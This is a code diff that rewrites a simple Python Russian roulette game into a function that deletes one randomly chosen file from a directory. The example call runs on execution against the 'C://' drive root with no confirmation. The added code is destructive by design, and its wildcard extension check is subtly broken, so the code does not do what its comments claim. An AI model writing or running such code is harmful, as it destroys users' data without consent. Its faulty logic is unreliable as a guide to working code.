@@ -1,23 +1,37 @@
+import os
 import random
-import time
 
-def russian_roulette():
-    print("Welcome to Russian Roulette!")
-    players = int(input("Enter the number of players: "))
-    bullets = random.randint(1, 6)  # Randomly place the bullet in one of the 6 chambers
-    print("Spin the chamber...")
-    time.sleep(2)  # Simulate spinning the chamber
-    print("Pull the trigger and hope for the best...")
+def russian_roulette_delete(directory, file_extension, num_chambers):
+    # Get list of files with specified extension
+    files = [f for f in os.listdir(directory) if f.endswith(file_extension)]
+    
+    if not files:
+        print("No files with the specified extension found in the directory.")
+        return
+    
+    print(f"Found {len(files)} files with the specified extension.")
 
-    for i in range(1, players + 1):
-        input(f"Player {i}, press Enter to pull the trigger...")
-        if bullets == i:
-            print(f"Player {i} has been shot! Game over!")
-            break
+    # Shuffle the list of files
+    random.shuffle(files)
+    
+    # Determine which chamber has the bullet
+    bullet_chamber = random.randint(1, num_chambers)
+    
+    # Play Russian roulette
+    for i, file in enumerate(files):
+        print(f"Pulling trigger for file: {file}")
+        if i == bullet_chamber - 1:
+            print("Bang! File deleted.")
+            os.remove(os.path.join(directory, file))
+            return
         else:
-            print(f"Player {i} survives!")
+            print("Click. Safe for now.")
 
-    print("Game over.")
+    print("The gun misfired. No files were deleted.")
 
-if __name__ == "__main__":
-    russian_roulette()
+# Example usage
+directory = "C://"
+file_extension = "*"  # Specify the file extension you want to delete
+num_chambers = 6  # Number of chambers in the revolver
+
+russian_roulette_delete(directory, file_extension, num_chambers)
